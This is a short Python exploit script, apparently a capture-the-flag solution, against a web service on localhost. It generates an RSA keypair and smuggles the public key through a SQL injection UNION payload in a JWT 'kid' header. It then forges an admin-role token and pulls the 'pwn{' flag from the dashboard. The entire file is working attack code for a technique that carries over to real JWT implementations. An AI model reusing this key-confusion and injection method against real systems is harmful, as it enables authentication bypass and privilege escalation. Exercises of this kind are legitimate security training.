#!/usr/bin/env python3
import requests
import jwt
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

TARGET_URL = "http://localhost:1337"
DASHBOARD_URL = f"{TARGET_URL}/dashboard"

def generate_keypair():
    print("[*] Generating Keypair...")
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    pem_private = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    # PKIX Format (BEGIN PUBLIC KEY)
    pem_public = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return pem_private, pem_public

def exploit():
    try:
        priv, pub = generate_keypair()
    except Exception as e:
        print(e)
        return

    # Hex Encode
    pub_hex = pub.hex()
    
    # Payload: Casting to TEXT to ensure driver compatibility
    # Dan pastikan ada spasi setelah '--'
    sqli_payload = f"a' UNION SELECT CAST(x'{pub_hex}' AS TEXT) -- "
    
    print(f"[*] Payload Len: {len(sqli_payload)}")

    # Forge Token
    payload = {"username": "admin", "role": "admin", "exp": int(time.time()) + 3600}
    token = jwt.encode(payload, priv, algorithm="RS256", headers={"kid": sqli_payload})
    
    # Attack
    print("[*] Sending...")
    r = requests.get(DASHBOARD_URL, cookies={"token": token})
    
    if "pwn{" in r.text or "Admin" in r.text:
        print("\n[+] PWNED! Flag Found:")
        for line in r.text.splitlines():
            if "pwn{" in line:
                print(line.strip())
        print()
    else:
        print("[-] Gagal.")

if __name__ == "__main__":
    exploit()
